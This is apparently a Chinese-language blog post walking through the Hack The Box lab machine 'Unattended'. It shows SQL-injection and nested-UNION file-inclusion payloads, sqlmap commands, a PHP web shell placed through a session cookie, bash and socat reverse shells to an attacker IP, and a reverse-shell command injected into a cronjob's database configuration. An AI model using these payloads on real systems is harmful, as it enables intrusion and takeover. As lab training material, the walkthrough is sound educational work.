> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FV_Nwoi2p3x8QE4L0mg3zQ)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **153** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_gif/3EPNqoHKW4BRzqSLECuFYDvLuibglVSw65C1k7QDP5W3v9j3qh9CAGBic0U98x5roiaeytB07tJjKMicOxXDEkMZAA/640?wx_fmt=gif)

靶机地址：https://www.hackthebox.eu/home/machines/profile/184

靶机难度：中级（4.4/10）

靶机发布日期：2019 年 5 月 30 日

靶机描述：

Unattended is a medium difficulty Linux box which needs a good knowledge of SQL and its programming flaws. A path traversal on the web server can be exploited to get the source code of the PHP pages. A SQL injection flaw is found, which can be exploited using nested unions to gain LFI. The LFI can then be leveraged to RCE via log files or sessions file. Database access allows the www user to change the configuration and inject commands into a cronjob running as a user. The user is a member of the grub group, which has access to the kernel image through which the root password can be obtained.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/h41DUw6VO9mavlgOEs5E8uIJy4OU51Kz7ln1orqTSrBFQGxUHMqCbF29Nug1TcNJocC8lI0HD6X5u4icbsBFLibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/XrTibiasJJtTGCeNnvsRZqfmYBstz1lHuPA72aRQYQiaOKfQicLkWLWJ5ePZY21XO6W37XzXKoeyPYz4ZJXqEXNZFw/640?wx_fmt=gif)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpEia93ZU6oPdgjPpaDEIyFSaiajpdbch21OjibN9HUias8t5YgJibeeBhjtA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.126...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpzKIet2PcKnoUwE2UUzfZYYd34QAicc5R107M4g1KAkDrIw7VRAhBsWg/640?wx_fmt=png)

nmap 发现开放了 http 和 https 服务...

其中包含了两个域名...www.nestedflanders.htb unattended.htb，添加到 hosts 中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpt1ibYs3XRRtjecLPbpvz6XmeNaI5ugmEkg3NozXlzB52reDlfPtfTBg/640?wx_fmt=png)

https 是 apache 服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpUnvdL9QYsxTghA3CBXSPic4LLvsMxwTRF04NTNng8s6nZtML2T8JjUw/640?wx_fmt=png)

枚举目录发现了 index.php 可访问...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNp59bLzOsibLEJXSW5X3WKILBJIBOg9A7R4mXDgnkCgMNvbDNQKMEOhFQ/640?wx_fmt=png)

该页面提示了只有三个链接，文字中提到必须还原到旧网站，“关于” 页面还引用了攻击...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNp5Vhr6ic7uzVMQ3Q9MzGeLIOpz8t858d4tLy4raFBOfaEsUhDOdTFslA/640?wx_fmt=png)

```
https://www.nestedflanders.htb/index.php?id=25' or '1
```

访问 main 的 id 是 25, about 是 465, contact 是 587... 我尝试对 main 简单的 sql_or 注入... 是存在的...

那下面我进行了 sqlmap 盲注...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpCiav3b7qU64yQVOOL2a7XkrCnw44LQl2K857uicDrvzvIBy67DWAI63Q/640?wx_fmt=png)

```
sqlmap -u "https://www.nestedflanders.htb/index.php?id=25" -D neddy --tables
```

通过 --dbs 枚举到了 neddy...

然后利用 sqlmap 列出了用户数据库 neddy 中的表信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpFaWFgjEXWboQ0ftcmibRUCYGodfM9qT6ib73cWRCxIAMjoAfkZcBCkeg/640?wx_fmt=png)

```
sqlmap -u "https://www.nestedflanders.htb/index.php?id=25" -D neddy -T idname --dump
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpn5rCiaQ1iaByhGo46lbESNnniaR7kr7edWiaRCkoUv8ZQCNBbAVOndAsPg/640?wx_fmt=png)

```
sqlmap -u "https://www.nestedflanders.htb/index.php?id=25" -D neddy -T filepath --dump
```

通过一步一步枚举，获得了三个文本表单信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpqibAmmeJzvfFIkrlvKYRTycw1gRW03YyCQLibUqjmHchT6xIfNLcG35w/640?wx_fmt=png)

检查看看有什么隐藏内容... 继续枚举信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpGjttwAflP0Ln55dLg78LfDfIUtiapupCEV754gzbklzuIP5rkfka0ug/640?wx_fmt=png)

这里获得了：

```
$username = "nestedflanders";$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
```

在 index.php 中，发现了完整的源代码...

其中开头包含了用户名和密码....

通过完整的源代码，分析查找 LFI 利用点...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNphvEeia88P4B3V69ofR1kOGIsLMia0p99PJlLz9ujgGwIfqpeEFzeHhdg/640?wx_fmt=png)

存在 $inc...

这里应该存在文件包含漏洞... 测试下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpzQPibscejNfcIaR4DmMCAFvAMbhJ3PyHA9jJuqRk6M5Fxxwgiac4Nf6w/640?wx_fmt=png)

```
https://www.nestedflanders.htb/index.php?id=25' UNION SELECT"'UNION SELECT'/etc/passwd'-- -"-- -
```

通过测试，果然存在文件包含漏洞.. 进一步枚举下看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNp11XxntnZ3AkwftUg931ia1DCicA0MEKwzBQWUmd0crWKVRvAqJqPaFXg/640?wx_fmt=png)

```
/var/lib/php/sessions/sess_kid5f8ebm04u252ep6fac2bo84
```

为了在 LFI 得到 RCE，利用 cookie 更新文件漏洞... 起作用了，下一步利用 cookie 生成的 RCE 输入 system() 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpkvrpiakEiaFQb05H7nUfpyq3RvxbERJ6iaqTY3IYDgicmDg2GD3RYqTic4g/640?wx_fmt=png)

```
cmd=id&
shell=<?php system($_GET['cmd']); ?>
```

输入简单的 shell... 获得了 www 低权用户信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpAmaJCLuCrG5Ya83wvPE0u9vkiatbnB2kamOPnTtibCGrGRLs8kHvH9Pw/640?wx_fmt=png)

```
bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'
```

输入简单的 shell，获得了外壳...

但是该用户下没安装 python 和 nc... 无法进行 tty.... 查看到靶机上安装了 socat...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpAnFL9r69TuJ1I48AVjRsHMsD51Q6xib7jO1vE3G8UUiaROHZyAYzxy3g/640?wx_fmt=png)

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.51:443
socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
```

可以 socat 用来获取完整的 tty，利用 socat 获得反向外壳...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpiboCpYtHtnSwNpiac5KfJPlvbqMKR3awSsLQ2mEddu0cl46rIibHKxk3w/640?wx_fmt=png)

```
mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e
```

并利用前面获得的用户名密码，登陆了靶机的 mysql.... 进入 neddy 数据库，检查 config 表格...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNp9hjtBMMOm8lcnw49OYic86ZJQasNe5Ks90Gu5AMdCyYU7BSYGMSNiaXQ/640?wx_fmt=png)

在 86 行存在一个 perl 脚本...

该脚本会不时地执行，我们无法读取或替换这些脚本，但是可以从数据库中更改该配置的值，并使用反向 shell 命令，由于没用 nc，继续利用 socat...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNplIib7tA4uzCfEq48ttUOUs0Xichfk1vbH1p7zb6CtV6icEPsVF4J3iaM8Q/640?wx_fmt=png)

```
update config set option_value = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.51:443" where id = 86;

select * from config where id = 86;
socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
```

修改完后，获得了反向外壳... 读取到了 user_flag 信息...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNp6tWsSOX8V6uGCOhpk8EcYhZ0JpvLBYV27Ltpjvpht0PZUWnsNlApOw/640?wx_fmt=png)

枚举了 grub 组信息，发现该组只有 / boot/initrd.img-4.9.0-8-amd64 在运行着...

copy 到新文件分析看... 这是 gzip 文件... 通过解压发现这是文档文件... 需要 cpio 提取...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpdtvGxLwjGoWgZ6DSdjG8wYF7GDKruYy1xgefGLY28bF6QNtriaSJDpw/640?wx_fmt=png)

使用 cpio 后打开了文档... 为启动 ramdisk 提供了文件系统...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNp28f5yV0T0p9hkqYpsuqGmNlaq2iaXJSXabD9Pe4iaibKbaYOZJ8ku8qGw/640?wx_fmt=png)

通过阅读 scripts/local-block/cryptroot 内容...

最主要的是该行 `/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen` 生成 root 密码并将其通过管道传输到 `$cryptopen`

意思就是 / sbin/uinitrd 会根据 c0m3s3f0ss34nt4n1 生成密匙...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPCb9OZG7UEmkGjWu2mmmNpPoTfxOvWAicUG4DtmHsSpr64whFshUCwlLZqbBDMw3jlKlsnj5We7Og/640?wx_fmt=png)

  

  

  

通过 / sbin/uinitrd 生成的密匙，尝试 root 成功登陆... 获得了 root 权限和 root_flag 信息...

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/aUOT8MibumibTezJtREQ7iabtA23O9WAFku4Bian1vXLOpxwIk705rqQvxdoBr6uT5hxFc9wq6XibJS5FjKdbsBC1dg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)